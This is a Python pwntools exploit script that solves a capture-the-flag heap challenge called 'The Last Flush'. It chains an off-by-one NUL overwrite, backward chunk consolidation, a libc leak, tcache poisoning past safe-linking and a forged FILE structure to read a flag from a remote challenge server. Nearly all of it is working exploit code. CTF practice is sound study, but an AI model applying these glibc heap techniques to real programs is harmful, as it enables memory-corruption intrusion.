#!/usr/bin/env python3
"""The Last Flush.

COMPACT of an exact-fit record (size % 16 == 8) writes a NUL over the next
chunk's PREV_INUSE bit. Freeing that neighbor consolidates backward across
the record. The dangling record is then a tcache fd write. Point it at the
summary FILE, set fileno to the already-open flag, and REVIEW_SUMMARY.
"""
import sys
from pwn import *

context.arch = "amd64"
context.log_level = "info"

WORK = "/home/sira/Documents/CTF/Lancang_Mekong_CTF_comp/solved/pwn_the_last_flush/work"
LD = f"{WORK}/ld-linux-x86-64.so.2"
BIN = f"{WORK}/chal"
HOST, PORT = "47.131.225.172", 19706

UNSORTED_OFF = 0x1D3CC0
VTABLE_OFF = 0x1D05E0
CHAIN_OFF = 0x1D4680
LOCAL = "--remote" not in sys.argv
# Local: 0/1/2 stdio, 3 journal, 4 flag. Remote has two extra fds, so journal is 5 and the flag is 6.
FLAG_FD = int(sys.argv[2]) if len(sys.argv) > 2 else (4 if LOCAL else 6)


def start():
    if LOCAL:
        return process([LD, "--library-path", WORK, BIN])
    return remote(HOST, PORT)


def menu(p):
    p.recvuntil(b"archive> ")


def cmd(p, line):
    menu(p)
    p.sendline(line if isinstance(line, bytes) else line.encode())
    return p.recvline().strip()


def review(p, i, n):
    menu(p)
    p.sendline(f"REVIEW {i} 0 {n}".encode())
    return bytes.fromhex(p.recvline().strip().decode())


def seal(p):
    lo, hi = 0, (1 << 64) - 1
    while lo <= hi:
        mid = (lo + hi) // 2
        line = cmd(p, f"SEAL {mid:016x}")
        if line.startswith(b"sealed"):
            return mid
        if line.startswith(b"higher"):
            lo = mid + 1
        elif line.startswith(b"lower"):
            hi = mid - 1
        else:
            raise RuntimeError(line)
    raise RuntimeError("seal exhausted")


def probe(p):
    def once(v):
        return int(cmd(p, f"PROBE {v:016x}").split()[1])

    base = once(0)
    secret = 0
    for i in range(64):
        if once(1 << i) > base:
            secret |= 1 << i
    if once(secret) != 64:
        raise RuntimeError(f"bad probe {secret:#x}")
    return secret


def store(p, n, data):
    assert len(data) == n
    line = cmd(p, f"STORE {n} {data.hex()}")
    if not line.startswith(b"stored"):
        raise RuntimeError(line)
    return int(line.split()[1].split(b"=")[1])


def main():
    p = start()
    s2 = seal(p)
    s1 = probe(p)
    log.info("%s", cmd(p, "OPEN_SUMMARY"))

    # Summary FILE is the chunk immediately before X. Recover X/Y absolutely
    # from the tcache safe-link, then every later address is relative to Y.
    x_id = store(p, 0x258, b"X" * 0x258)
    y_id = store(p, 0x258, b"Y" * 0x258)
    cmd(p, f"DROP {x_id}")
    x_page = u64(review(p, x_id, 8))
    x2 = store(p, 0x258, b"\x00" * 0x258)
    cmd(p, f"DROP {y_id}")
    cmd(p, f"DROP {x2}")
    y_user = u64(review(p, x2, 8)) ^ x_page
    x_user = y_user - 0x260
    file_user = x_user - 0x1E0
    log.success("X %#x Y %#x FILE %#x", x_user, y_user, file_user)
    if (x_user >> 12) != x_page:
        raise RuntimeError(f"page mismatch {x_user>>12:#x} vs {x_page:#x}")

    # Pop both freed chunks so the next stores come from the top.
    store(p, 0x258, b"\x00" * 0x258)
    store(p, 0x258, b"\x00" * 0x258)

    a_user = y_user + 0x260
    a_chunk = a_user - 0x10
    A = bytearray(b"A" * 0x258)
    A[0:8] = p64(a_chunk)
    A[8:16] = p64(a_chunk)
    A[0x250:0x258] = p64(0x260)
    a_id = store(p, 0x258, bytes(A))
    b_id = store(p, 0x4F8, b"B" * 0x4F8)
    g_id = store(p, 0x258, b"G" * 0x258)

    if LOCAL:
        maps = open(f"/proc/{p.pid}/maps").read().splitlines()
        pie = int(next(l for l in maps if "/chal" in l).split("-")[0], 16)
        mem = open(f"/proc/{p.pid}/mem", "rb")
        mem.seek(pie + 0x5308)
        real = u64(mem.read(8))
        log.info("FILE check %#x real %#x", file_user, real)
        mem.close()
        if real != file_user:
            raise SystemExit("FILE address mismatch")

    log.info("%s", cmd(p, f"COMPACT {a_id}"))
    log.info("%s", cmd(p, f"DROP {b_id}"))
    libc = u64(review(p, a_id, 8)) - UNSORTED_OFF
    log.success("libc %#x", libc)

    alias = store(p, 0x258, b"C" * 0x258)
    store(p, 0x4F8, b"R" * 0x4F8)
    cmd(p, f"DROP {g_id}")
    cmd(p, f"DROP {alias}")
    poison = file_user ^ (a_user >> 12)
    log.info("%s", cmd(p, f"WRITE {a_id} 0 {p64(poison).hex()}"))

    buf = y_user
    fake = bytearray(0x258)
    fake[0x00:0x08] = p64(0xFBAD2088)
    for off in (0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38):
        fake[off:off + 8] = p64(buf)
    fake[0x40:0x48] = p64(buf + 0x180)
    fake[0x68:0x70] = p64(libc + CHAIN_OFF)
    fake[0x70:0x78] = p64(FLAG_FD)
    fake[0x88:0x90] = p64(x_user)          # zeroed lock
    fake[0xA0:0xA8] = p64(x_user + 0x80)   # zeroed wide_data
    fake[0xC0:0xC8] = p64(0xFFFFFFFF)
    fake[0xD8:0xE0] = p64(libc + VTABLE_OFF)

    store(p, 0x258, b"D" * 0x258)
    got = store(p, 0x258, bytes(fake))
    log.info("fake record %d", got)

    menu(p)
    p.sendline(b"REVIEW_SUMMARY 128")
    raw = p.recvline(timeout=3) or b""
    log.info("raw %r", raw)
    if not raw.strip():
        log.failure("empty read fd %d", FLAG_FD)
        return
    blob = bytes.fromhex(raw.strip().decode())
    key = p64(s1 ^ s2 ^ (libc + UNSORTED_OFF))
    plain = bytes(c ^ key[i & 7] for i, c in enumerate(blob))
    log.success("%s", plain)
    p.close()


if __name__ == "__main__":
    main()
